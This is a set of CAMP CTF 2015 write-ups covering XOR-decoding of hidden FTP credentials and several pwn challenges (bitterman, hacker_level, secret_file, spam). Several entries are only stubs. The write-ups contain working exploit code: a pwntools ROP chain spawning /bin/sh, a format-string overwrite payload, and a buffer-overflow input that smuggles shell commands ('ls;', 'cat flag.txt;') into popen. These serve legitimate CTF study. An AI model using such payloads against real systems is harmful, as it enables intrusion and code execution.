+$ cat parameters | while read par; do KEYSIZE=$(echo -n "$par" | wc | awk '{print $3}'); KEYSIZE=$((KEYSIZE)); python2.7 xor-strings.py "$par" "$(head -c$KEYSIZE key)" | xxd -r -p && echo; done
ftpuser
172.16.54.1
sw-mor-dc01-blmhpi153-2.seat.it
CAMP15_187db04a23016f4bfd957f89dbaa5691f529808de3c1edfc6fffe15602210e12
```

We now got the credentials, `ftpuser` and `CAMP15_187db04a23016f4bfd957f89dbaa5691f529808de3c1edfc6fffe15602210e12` as well as the ftp server, `172.16.54.1` as parameters.

Since this writeup is written after the CTF ended, we guess that the flag either is `CAMP15_187db04a23016f4bfd957f89dbaa5691f529808de3c1edfc6fffe15602210e12` or can be downloaded from the ftp server using the credentials.

## Other write-ups and resources

* <https://fischer-its.com/?p=1991>
* <http://dft-labs.eu/~ctf/CCCCAMP_2015/APT-incident-response/writeup.txt> 
# CAMP CTF 2015: bitterman-300

**Category:** Pwn
**Points:** 300
**Solves:** 31
**Description:**

> Can you exploit this one for me? [bitterman](bitterman) is running on challs.campctf.ccc.ac:10103 This time NX is enabled, to make sure it's not too easy. Here's the [libc](libc.so.6).


## Write-up

by [ctfhacker](https://github.com/ctfhacker)

# Bitterman

## Recon

Upon connecting, we are given a prompt which asks for the following items:
* Name
* Length of a message
* The message itself

As per normal, let's try the low hanging fruit of throwing lots of data at each field to see if we get a crash.

Turns out, if we say that we will send 1024 bytes and send 1024 bytes, we crash *shrug* (If there is time after the CTF, I'll go back and see what exactly caused the crash)

## Exploit

Because NX is turned on, we need to do some fancy ROP. Our ROP strategy is below:
* Leak a libc address via ROPing to `puts()` with `puts` as the parameter. 
    - This will return the address of `puts` in the libc the binary is using. 
    - We can calculate the libc base address since we were given their libc in the problem (leaked_libc_read_address - original_libc_from_challenge = base_libc_on_server)
* Call main so we can re-exploit with the knowledge of the libc base address.

This ROP construction is here:
```python
from pwn import *

elf = ELF('./bitterman')
rop = ROP(elf)

rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

print rop.dump()
```

Leaking the address from this ROP chain and rebasing the libc address in pwntools is below:
```python
# Be sure to add the zeros that we miss due to string read
# Grab the first 8 bytes of our output buffer
leaked_puts = r.recv()[:8].strip().ljust(8, '\x00')

# Convert to integer
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
```

From here, we can create a second ROP which will simply call `system` with `/bin/sh`. Luckily, `/bin/sh` is in libc, so we simply find where that string is, and call `system` with it.

The second ROP construction is below:

```python
# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
rop2.system(next(libc.search('/bin/sh\x00')))

print rop2.dump()
```

Our shell is received and the flag is given:

```python
$ ls
bitterman
flag.txt
run.sh
$ cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80
```

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/campctf-2015-bitterman/> 
* <https://github.com/thebarbershopper/ctf-writeups/tree/master/campctf-2015/bitterman-pwn-400>
* [Chinese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001675.html)
# CAMP CTF 2015: datenklo-manager-300

**Category:** Pwn
**Points:** 300
**Solves:** 17
**Description:**

> There are too many datenklo's, this tool is for managing them.
>
>> nc challs.campctf.ccc.ac 10102
>
> [dkm.elf](dkm.elf)


## Write-up

(TODO)

## Other write-ups and resources

* <http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm/>
* <http://daehee87.tistory.com/525>
# CAMP CTF 2015: hacker_level-200

**Category:** Pwn
**Points:** 200
**Solves:** 64
**Description:**

> What's your hacker level?
>
> Find out with this nifty little app at challs.campctf.ccc.ac:10118. You can also run your own instance: [hacker_level](hacker_level.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/campctf-2015-hacker-level/> 

### Meta

Vulnerability:

* Format String
* Hardcoded Check Evasion

We are given an unstripped 32bit ELF for i386 Linux:

```bash
$ file hacker_level
hacker_level: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=29288494155b99bcb97cd3af0961c9a34d307be2, not stripped
```

Running the binary:

```bash
$ ./hacker_level
What's your name? hello
Hello, hello
Sorry, you're not leet enough to get the flag :(
Your hacker level is: 0x3076
```

We can input a name, which is then printed back to us.

We open the binary in `radare2` to print available functions:

```bash
[0x080486ea]> aa
[0x080486ea]> afl | sort -k1 | column -t
0x08048440  35   3   sym._init
0x08048480  16   2   sym.imp.setbuf
0x08048490  16   2   sym.imp.printf
0x080484a0  16   2   sym.imp.fgets
0x080484b0  16   2   sym.imp.fclose
0x080484c0  16   2   sym.imp.__stack_chk_fail
0x080484d0  16   2   sym.imp.usleep
0x080484e0  16   2   sym.imp.fread
0x080484f0  16   2   sym.imp.puts
0x08048500  16   2   loc.imp.__gmon_start__
0x08048510  16   2   sym.imp.__libc_start_main
0x08048520  16   2   sym.imp.fopen
0x08048530  476  11  section..text
0x080486ea  34   1   entry0
0x08048710  4    1   sym.__x86.get_pc_thunk.bx
0x08048720  43   4   sym.deregister_tm_clones
0x08048750  53   4   sym.register_tm_clones
0x08048790  30   3   sym.__do_global_dtors_aux
0x080487b0  43   4   sym.frame_dummy
0x080487e0  93   4   sym.__libc_csu_init
0x08048840  2    1   sym.__libc_csu_fini
0x08048844  20   1   sym._fini
```

We see some interesting imported functions, such as `fgets`, `printf` and `fread`, as well as our binarys functions, all cluttered together in `section..text`.

Fortunately, we are given the source code of our binary, [hacker_level.c](./hacker_level.c).

We can see some interesting things:

* In line `21`, we can clearly see our input handed - without modifications - to `printf` as the first parameter. This indicates a Format String Vulnerability.
* In line `24`, we see a check of our `level` object against `0xCCC31337`:
  * If it fails, it just prints that we don't have the correct hacker level
  * If it succeeds, the flag is read from `flag.txt` (if it exists) and printed to us
* The function `calc_level` calculates our level in such a way that we never achieve the correct level in a legal way. Our level is always calculated modulo `0xcafe`.

Having these statements in mind, we know that we have to overwrite `level` to fit `0xCCC31337`.

We first have to find out the address to `level`, e.g. in `radare2`, to overwrite it using a Format String Exploit:

```bash
[0x080486ea]> is | grep level
vaddr=0x0804a04c paddr=0x0000104c ord=044 fwd=NONE sz=4 bind=LOCAL type=OBJECT name=level
```

Now that we have the address to `level` (`0x0804a04c`), we have to find the correct offset to our input.

First, decompile the text section of our binary in `radare2` to find the address to our `printf(name);` call:

```bash
[0x080486ea]> aa
[0x080486ea]> pdf @ section..text 
            ;-- main:
            ;-- main:
            ;-- section_end..plt:
/ (fcn) section..text 476
|           ; var int local_0_1    @ ebp-0x1
[...]
|           0x080485fd      c70424738804.  mov dword [esp], str.Hello_ ; hacker_level.c:20  printf("Hello, "); ; [0x8048873:4]=0x6c6c6548  LEA str.Hello_ ; "Hello, " @ 0x8048873 ; .//hacker_level.c:20  .usleep(150000);
|           0x08048604      e887feffff     call sym.imp.printf
|           0x08048609      891c24         mov dword [esp], ebx        ; hacker_level.c:21  printf(name); ; .//hacker_level.c:21  .printf(\"Hello, \");
|           0x0804860c      e87ffeffff     call sym.imp.printf
|           0x08048611      c7042460ae0a.  mov dword [esp], 0xaae60    ; hacker_level.c:23  usleep(700000); ; [0xaae60:4]=-1 ; .//hacker_level.c:23  
|           0x08048618      e8b3feffff     call sym.imp.usleep
[...]
```

Looks like we have to set a breakpoint in `gdb` at `0x0804860c` to avoid bruteforcing the correct offset for our Format String Exploit:

```bash
gdb-peda$ b *0x0804860c
Breakpoint 1 at 0x804860c: file hacker_level.c, line 21.
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/camp-hackercalc/hacker_level 
What's your name? AAAA%x.%x.%x
Hello, [----------------------------------registers-----------------------------------]
EAX: 0x7 
EBX: 0xffffd4bc ("AAAA%x.%x.%x\n")
ECX: 0x7 
EDX: 0xf7fb9898 --> 0x0 
ESI: 0xffffd4c9 --> 0x0 
EDI: 0xffffd4fc --> 0x0 
EBP: 0xffffd568 --> 0x0 
ESP: 0xffffd4a0 --> 0xffffd4bc ("AAAA%x.%x.%x\n")
EIP: 0x804860c (<main+220>:     call   0x8048490 <printf@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485fd <main+205>:        mov    DWORD PTR [esp],0x8048873
   0x8048604 <main+212>:        call   0x8048490 <printf@plt>
   0x8048609 <main+217>:        mov    DWORD PTR [esp],ebx
=> 0x804860c <main+220>:        call   0x8048490 <printf@plt>
   0x8048611 <main+225>:        mov    DWORD PTR [esp],0xaae60
   0x8048618 <main+232>:        call   0x80484d0 <usleep@plt>
   0x804861d <main+237>:        add    esp,0x10
   0x8048620 <main+240>:        cmp    DWORD PTR ds:0x804a04c,0xccc31337
Guessed arguments:
arg[0]: 0xffffd4bc ("AAAA%x.%x.%x\n")
[------------------------------------stack-------------------------------------]
0000| 0xffffd4a0 --> 0xffffd4bc ("AAAA%x.%x.%x\n")
0004| 0xffffd4a4 --> 0x40 ('@')
0008| 0xffffd4a8 --> 0xf7fb8c20 --> 0xfbad208b 
0012| 0xffffd4ac --> 0xf7ffdaf0 --> 0xf7ffda94 --> 0xf7fbc2b8 --> 0xf7ffd938 --> 0x0 
0016| 0xffffd4b0 --> 0xffffd570 --> 0x80487e0 (<__libc_csu_init>:       push   ebp)
0020| 0xffffd4b4 --> 0xf7fe57aa (cmp    eax,0x0)
0024| 0xffffd4b8 --> 0xffffd520 --> 0xffffffff 
0028| 0xffffd4bc ("AAAA%x.%x.%x\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804860c in main () at hacker_level.c:21
21              printf(name);
gdb-peda$ x/20wx $esp
0xffffd4a0:     0xffffd4bc      0x00000040      0xf7fb8c20      0xf7ffdaf0
0xffffd4b0:     0xffffd570      0xf7fe57aa      0xffffd520      0x41414141
0xffffd4c0:     0x252e7825      0x78252e78      0x0000000a      0x00000000
```

Our stack can be represented as such:

![](./stack.png)

On the left side, we can see what `printf` expects on the stack. On the right side, we see the values and addresses pushed to the stack.

Our input, `AAAA`, is assumed to be the format string and has the address `0xffffd4bc`.

It also is the `7th` word on the stack after the assumed format string - this is our offset.

To confirm:

```bash
$ ./hacker_level
What's your name? AAAA%x.%x.%x.%x.%x.%x.%x
Hello, AAAA40.f7745c20.f778aaf0.ffb684d0.f77727aa.ffb68480.41414141
Sorry, you're not leet enough to get the flag :(
Your hacker level is: 0x8957
```

The seventh `%x` in our test format string `AAAA%x.%x.%x.%x.%x.%x.%x` prints the beginning of our input, `41414141` - sweet!

If we switch `AAAA` with the address `level`, we can use `printf` to store a value into the given address using the format operand `%n`.

`%n` stores the number already printed into a given offset that we can specify by using the `<num>$` prefix. `%7$n` would mean store the number of characters printed into the seventh format string argument.

However, since we don't want to print `0xCCC31337`==`3435336503` characters to store the value, we have to split this operation into two smaller ones:

* Store the value `0x1337`==`4919` into the second half of `level`. Address: `0x0804a04c`
* Store the value `0xCCC3`==`52419` into the first half of `level`. Address: `0x0804a04e`
* Subtract previously printed characters from each value, making the value for the second half `4911` (8 bytes printed for both addresses) and the first half `47500` (`52149`-`4919`)

Our `printf` call will look like that: `printf("formatstring/input", &level_firsthalf, &level_secondhalf);`.

The final exploit is the following:

```bash
$ python -c 'print "\x4c\xa0\x04\x08\x4e\xa0\x04\x08%.4911u%7$hn%.47500u%8$hn"' > in
gdb-peda$ r < in
Starting program: /home/vbox/pwn/tasks/camp-hackercalc/hacker_level < in
What's your name? Hello, LN0000000000[...]
[...]
[...]00000004160457760
The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604
[Inferior 1 (process 2925) exited normally]
Warning: not running or target is remote
```

The flag is `CAMP15_337deec05ccc63b1168ba3379ae4d65854132604`.

Note that this writeup is not as perfect as others. Please read others and fix issues with this one (e.g. the order of halves and their addresses), if you can!

## Other write-ups and resources

* <https://bannsecurity.com/index.php/home/10-ctf-writeups/32-camp-ctf-2015-hacker-level>
* <https://ctf-team.vulnhub.com/campctf-2015-hacker-level/> 
* <https://nuc13us.wordpress.com/2015/09/04/hacker_level-200-campctf-2015/>
* [Russian](http://reu.org.ua/camp-ctf-2015-hacker-level.html)
* [Japanese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001675.html)
* A similar challenge by [exploit-exercises](https://exploit-exercises.com/protostar/format3/) and a [writeup](https://www.mattandreko.com/2012/02/01/exploit-exercises-protostar-format-3/)
# CAMP CTF 2015: phobos-300

**Category:** Pwn
**Points:** 300
**Solves:** 30
**Description:**

> This [one](phobos) has NX disabled. So it's easy, right?
>
> Running on `challs.campctf.ccc.ac:10106`


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/campctf-2015-bitterman/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/08/18/153828)
* [Japanese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001675.html)
# CAMP CTF 2015: ropcalc-225

**Category:** Pwn
**Points:** 225
**Solves:** 38
**Description:**

> Ordinary calculators are obsolete now.
>
> [ropcalc](ropcalc) is [running](server.py) on `challs.campctf.ccc.ac:10109`


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/campctf-2015-ropcalc/> 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/08/18/153828)
* <http://pastebin.com/ya4LRHGd>
# CAMP CTF 2015: secret_file-150

**Category:** Pwn
**Points:** 150
**Solves:** 57
**Description:**

> You have to recover some data from `challs.campctf.ccc.ac:10105`.
>
> Binary: [secret_file](secret_file)

## Write-up

by [polym](https://github.com/abpolym)

* <https://nuc13us.wordpress.com/2015/08/16/secret_file-150-cscamp-ctf-2015/>  (Common understanding)
* <https://ctf-team.vulnhub.com/campctf-2015-secret-file/> (Detailed understanding)
* [Russian](http://reu.org.ua/camp-ctf-2015-secret-file.html) (IDA Decompiled Source, CTX struct)
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/08/18/153828) (Handmade? Decompile Source)

### Meta

* Check Evasion `ce`
* Command Injection `ci`
* Stack Buffer Overflow `sbo`

We are given a x86-64bit stripped ELF for Linux:

```bash
$ file secret_file 
secret_file: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=700ac7785d436db2bbb5642f99678fe1ef0394b8, stripped
```

Running it:

```bash
$ ./secret_file 
hello?
wrong password!
```

It seems to ask for a password, which we don't have.

I've set up an `ltrace` alias `lt() { [[ $# -eq 1 ]] && ltrace -s 256 -f "$1" 2> /tmp/out; }` that dumps all output to `/tmp/out`, which i can then continually watch with `tail -f /tmp/out`.

Running `lt` on it results in this output:

```bash
$ lt ./secret_file 
hello
wrong password!
$ tail -f /tmp/out 
[pid 4200] __libc_start_main(0x7f1a6d4d8af0, 1, 0x7ffff3024f98, 0x7f1a6d4d8f90 <unfinished ...>
[pid 4200] snprintf("/bin/cat ./secret_data.asc", 27, "%s", "/bin/cat ./secret_data.asc")                     = 26
[pid 4200] snprintf("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127", 65, "%s", "9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127") = 64
[pid 4200] getline(0x7ffff3024bb8, 0x7ffff3024bb0, 0x7f1a6ced2640, 64)                                        = 6
[pid 4200] strrchr("hello\n", '\n')                                                                           = "\n"
[pid 4200] strcpy(0x7ffff3024bc0, "hello")                                                                    = 0x7ffff3024bc0
[pid 4200] SHA256_Init(0x7ffff3024b00, 0x7ffff3024d1c, 256, 0x7f1a6f602010)                                   = 1
[pid 4200] SHA256_Update(0x7ffff3024b00, 0x7ffff3024bc0, 256, 0)                                              = 1
[pid 4200] SHA256_Final(0x7ffff3024d1c, 0x7ffff3024b00, 0x264bca26, 0xc0bff47e)                               = 1
[pid 4200] snprintf("8c", 3, "%02x", 0x8c)                                                                    = 2
[pid 4200] snprintf("3e", 3, "%02x", 0x3e)                                                                    = 2
[pid 4200] snprintf("ac", 3, "%02x", 0xac)                                                                    = 2
[pid 4200] snprintf("b1", 3, "%02x", 0xb1)                                                                    = 2
[pid 4200] snprintf("52", 3, "%02x", 0x52)                                                                    = 2
[pid 4200] snprintf("1d", 3, "%02x", 0x1d)                                                                    = 2
[pid 4200] snprintf("fa", 3, "%02x", 0xfa)                                                                    = 2
[pid 4200] snprintf("0b", 3, "%02x", 0xb)                                                                     = 2
[pid 4200] snprintf("1d", 3, "%02x", 0x1d)                                                                    = 2
[pid 4200] snprintf("00", 3, "%02x", 0)                                                                       = 2
[pid 4200] snprintf("07", 3, "%02x", 0x7)                                                                     = 2
[pid 4200] snprintf("77", 3, "%02x", 0x77)                                                                    = 2
[pid 4200] snprintf("ee", 3, "%02x", 0xee)                                                                    = 2
[pid 4200] snprintf("c1", 3, "%02x", 0xc1)                                                                    = 2
[pid 4200] snprintf("fe", 3, "%02x", 0xfe)                                                                    = 2
[pid 4200] snprintf("7e", 3, "%02x", 0x7e)                                                                    = 2
[pid 4200] snprintf("7b", 3, "%02x", 0x7b)                                                                    = 2
[pid 4200] snprintf("90", 3, "%02x", 0x90)                                                                    = 2
[pid 4200] snprintf("b5", 3, "%02x", 0xb5)                                                                    = 2
[pid 4200] snprintf("a6", 3, "%02x", 0xa6)                                                                    = 2
[pid 4200] snprintf("08", 3, "%02x", 0x8)                                                                     = 2
[pid 4200] snprintf("e8", 3, "%02x", 0xe8)                                                                    = 2
[pid 4200] snprintf("13", 3, "%02x", 0x13)                                                                    = 2
[pid 4200] snprintf("37", 3, "%02x", 0x37)                                                                    = 2
[pid 4200] snprintf("e0", 3, "%02x", 0xe0)                                                                    = 2
[pid 4200] snprintf("22", 3, "%02x", 0x22)                                                                    = 2
[pid 4200] snprintf("26", 3, "%02x", 0x26)                                                                    = 2
[pid 4200] snprintf("96", 3, "%02x", 0x96)                                                                    = 2
[pid 4200] snprintf("c6", 3, "%02x", 0xc6)                                                                    = 2
[pid 4200] snprintf("d4", 3, "%02x", 0xd4)                                                                    = 2
[pid 4200] snprintf("7d", 3, "%02x", 0x7d)                                                                    = 2
[pid 4200] snprintf("48", 3, "%02x", 0x48)                                                                    = 2
[pid 4200] strcmp("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127", "8c3eacb1521dfa0b1d000777eec1fe7e7b90b5a608e81337e0222696c6d47d48") = 1
[pid 4200] puts("wrong password!")                                                                            = 16
[pid 4200] __cxa_finalize(0x7f1a6d6da008, 0, 0, 1)                                                            = 0x7f1a6ced3290
[pid 4200] +++ exited (status 1) +++
```

We see the following:

* Using `snprintf`, the string `/bin/cat ./secret_data.asc` (`4th` argument) with length `27` (`2nd` argument) is put into a buffer (`1st` argument)
* Using `snprintf`, some hash `9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127` is put into another bufer
* The program then calls `getline`, presumably to get out input and then runs `strrchr` to locate the `newline` in our string, copying the input until the first `\n` to a stack buffer at `0x7ffff3024bc0` with `strcpy`.
* `256` bytes of our input then is used to form a [sha256](https://www.openssl.org/docs/manmaster/crypto/sha.html) message digest with `SHA256_Init` initializing a `SHA_CTX` struct at `0x7ffff3024b00`, `SHA256_Update` hashing the data at `0x7ffff3024bc0` with length `256` and `SHA256_Final` erasing the `SHA_CTX` struct while storing the message digest to `0x7ffff3024d1c`. (see `man 3 sha`) 
* `snprintf` is then called, printing a byte value into a buffer presumably from our message digest with the format `%02x`.
* Finally, `strcmp` compares both the initially loaded message digest with out input's message digest

Our goal seems to be to surpass this `strcmp` test. If you have a look at [this](http://charo-it.hatenablog.jp/entry/2015/08/18/153828) or [this writeup](http://reu.org.ua/camp-ctf-2015-secret-file.html) you can see some pseudo C code that confirms that suspicion.

We notice that `strcpy` is called on our input without any preceding length check - this is a Stack Buffer Overflow!

Providing the binary with `0x400` `A`s:

```bash
$ p -c 'print "A"*0x200' | ltrace -f ./secret_file 2>/tmp/out
$ tail -f /tmp/out
[...]
[pid 4436] getline(0x7fff2bbd5c18, 0x7fff2bbd5c10, 0x7fcf451c1640, 64)                                        = 513
[pid 4436] strrchr("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., '\n')                                               = "\n"
[pid 4436] strcpy(0x7fff2bbd5c20, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                      = 0x7fff2bbd5c20
[pid 4436] SHA256_Init(0x7fff2bbd5b60, 0x7fff2bbd5d7c, 256, 0x7fcf45b46210)                                   = 1
[pid 4436] SHA256_Update(0x7fff2bbd5b60, 0x7fff2bbd5c20, 256, 0)                                              = 1
[pid 4436] SHA256_Final(0x7fff2bbd5d7c, 0x7fff2bbd5b60, 0xb9d5c97a, 0x2e523471)                               = 1
[pid 4436] snprintf("e0", 3, "%02x", 0xe0)                                                                    = 2
[...]
[pid 4436] snprintf("bb", 3, "%02x", 0xbb)                                                                    = 2
[pid 4436] strcmp("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., "e075f2f51cad23d0537186cfcd50f911"...)               = -36
[...]
```

It looks like it overwrites the value of the initial message digest and compares with our inputs message digest - which is a hash over 256 `A`s:

```bash
$ p -c 'import sys; sys.stdout.write("A"*0x100)' |sha256sum 
e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb  -
```

After some testing, we see that the initial message digest can be overwritten starting at the `0x11b`th byte, or `0x100+0x1b`==`256+27`th byte:

```bash
$ p -c 'print "A"*0x100+"B"*0x1B+"test"' | ltrace -f ./secret_file 2>/tmp/out
wrong password!
$ tail -f /tmp/out
[...]
[pid 4451] snprintf("bb", 3, "%02x", 0xbb)                                                                    = 2
[pid 4451] strcmp("test", "e075f2f51cad23d0537186cfcd50f911"...)                                              = 15
[pid 4451] puts("wrong password!")                                                                            = 16
```

Let's provide it with the correct hash and see what it does:

```bash
$ p -c 'print "A"*0x100+"B"*0x1B+"e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb"' | ./secret_file 
sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
```

Looks suspicious and smells like Command Injection!

If we have a look at `radare2`'s graph by doing this:

* Open `r2 ./secret_file`
* Execute `aa`: `[0x00000ca0]> aa`
* Enter `V`isual mode by pressing `V`, then `p` to go into assembly view:
![](./r2-visual.png)
* Go to the `main` function (Just press once `N`):
![](./r2-main.png)
* Press `V` again

Then we can see a `popen` call being executed, if `strmp` is successful (see the red line with path name `f`alse, leading to the branch if `jne eax eax` after `strmp` is not true?):

![](./r2-graph.png)

So this suggests, that `popen` is called on the part of our input after the newline `\n` - which is why we get an error message from `sh` telling us that the command `BBBBBBBBBBBBBBBBBBBBBBBBBBBe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb` doesn't exist.

So we try to inject a valid command and seperate the valid command with the invalid command by adding a `;` after our valid command:

```bash
$ p -c 'print "A"*0x100+"ls;".ljust(0x1B,"B")+"e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb"' | ./secret_file 
flag.txt
secret_data.asc
secret_file
sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
```

Let's see what is in both `flag.txt` and `secret_data.asc`:

```bash
$ p -c 'print "A"*0x100+"cat secret_data.asc;".ljust(0x1B,"B")+"e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb"' | ./secret_file                                
You do not really think it's that easy, do you?
sh: 1: BBBBBBBe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
$ p -c 'print "A"*0x100+"cat flag.txt;".ljust(0x1B,"B")+"e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb"' | ./secret_file
CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
sh: 1: BBBBBBBBBBBBBBe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
```

We see our flag, `CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7`!

PS: We at first cannot set breakpoints and debug the file properly using `gdb`, since `PIE` is enabled:
```bash
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

However, if you run the binary in `gdb` and then have a look at the by gdb started process `./secret_file` with `vmmap` or `pmap` using its `PID`, you can set breakpoints and run the program with the correct base.

```bash
$ pmap 4555
4555:   /home/vbox/pwn/tasks/camp/secret-file/secret_file
0000555555554000      8K r-x-- secret_file
0000555555755000      4K r---- secret_file
0000555555756000      4K rw--- secret_file
0000555555757000    132K rw---   [ anon ]
00007ffff7436000     12K r-x-- libdl-2.19.so
gdb-peda$ b *0x0000555555554000+0xaf0
Breakpoint 1 at 0x555555554af0
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/camp/secret-file/secret_file 
[----------------------------------registers-----------------------------------]
RAX: 0x555555554af0 (push   r13)
RBX: 0x0 
RCX: 0x0 
RDX: 0x7fffffffe508 --> 0x7fffffffe796 ("LC_PAPER=de_DE.UTF-8")
RSI: 0x7fffffffe4f8 --> 0x7fffffffe764 ("/home/vbox/pwn/tasks/camp/secret-file/secret_file")
RDI: 0x1 
RBP: 0x0 
RSP: 0x7fffffffe418 --> 0x7ffff765bec5 (<__libc_start_main+245>:        mov    edi,eax)
RIP: 0x555555554af0 (push   r13)
R8 : 0x7ffff79f9e80 --> 0x0 
R9 : 0x7ffff7dea560 (<_dl_fini>:        push   rbp)
R10: 0x478bfbff 
R11: 0x5 
R12: 0x555555554ca0 (xor    ebp,ebp)
R13: 0x7fffffffe4f0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554ae0 <__cxa_finalize@plt>: jmp    QWORD PTR [rip+0x2014e2]        # 0x555555755fc8
   0x555555554ae6 <__cxa_finalize@plt+6>:       push   0x10
   0x555555554aeb <__cxa_finalize@plt+11>:      jmp    0x5555555549d0
=> 0x555555554af0:      push   r13
   0x555555554af2:      push   r12
   0x555555554af4:      push   rbp
   0x555555554af5:      push   rbx
   0x555555554af6:      sub    rsp,0x2e8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe418 --> 0x7ffff765bec5 (<__libc_start_main+245>:       mov    edi,eax)
0008| 0x7fffffffe420 --> 0x7fffffffe508 --> 0x7fffffffe796 ("LC_PAPER=de_DE.UTF-8")
0016| 0x7fffffffe428 --> 0x7fffffffe4f8 --> 0x7fffffffe764 ("/home/vbox/pwn/tasks/camp/secret-file/secret_file")
0024| 0x7fffffffe430 --> 0x100000000 
0032| 0x7fffffffe438 --> 0x555555554af0 (push   r13)
0040| 0x7fffffffe440 --> 0x0 
0048| 0x7fffffffe448 --> 0x35bb7410a37bb082 
0056| 0x7fffffffe450 --> 0x555555554ca0 (xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554af0 in ?? ()
```

Otherwise, just set a breakpoint at `__libc_start_main` or even use [this neat trick](http://reverseengineering.stackexchange.com/questions/8724/set-a-breakpoint-on-gdb-entry-point-for-stripped-pie-binaries-without-disabling)!

```
gdb-peda$ b *__libc_start_main
Breakpoint 1 at 0x7ffff765bdd0: file libc-start.c, line 133.
```

PS: Some commercial IDA Plugin named Hex-Rays Decompiler can decompile `x86_64` into good looking pseudo C code, such as done in [this writeup](http://reu.org.ua/camp-ctf-2015-secret-file.html). There exist [some decompilers](https://en.wikibooks.org/wiki/X86_Disassembly/Disassemblers_and_Decompilers#Common_Decompilers) for `x86`, but only some can decompile for `x86_64` and only few do in fact print readable C code. I tried some of these decompilers, but none of these, which I've tested and do state that they decompile 64bit binaries, can in fact compete with the Plugin. If you know a good 64bit decompiler, please create an issue, notifying me!


## Other write-ups and resources

* <https://nuc13us.wordpress.com/2015/08/16/secret_file-150-cscamp-ctf-2015/> 
* <https://ctf-team.vulnhub.com/campctf-2015-secret-file/>
* [Russian](http://reu.org.ua/camp-ctf-2015-secret-file.html)
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/08/18/153828)
# CAMP CTF 2015: shell-300

**Category:** Pwn
**Points:** 300
**Solves:** 25
**Description:**

> [Shell](shell) is running on `challs.campctf.ccc.ac:10117`


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/campctf-2015-shell/> 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/08/18/153828)
# CAMP CTF 2015: spam-100

**Category:** Pwn
**Points:** 100
**Solves:** 107
**Description:**

> You have problems remembering all your different passwords?
>
> [Here](spam.py) is THE tool for you!
>
> `nc challs.campctf.ccc.ac 10113`


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/vito-lbs/cccctf/tree/master/spam>
* <https://pacmans.army/?p=290>
* <http://blog.whatever.io/2015/08/18/campctf-spam100-pwn/>

### Meta

Keywords:

* Python Pickle `pickle`
* Remote Code Execution `rce`

We are given a Python file, which essentially is a Password Manager Service.

Running it creates a service that listens on port `1024`:

```bash
remote$ python spam.py
[...] <listens>

# On another terminal:
$ nc localhost 1024
Welcome to Super Password Authentication Manager (SPAM)!
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
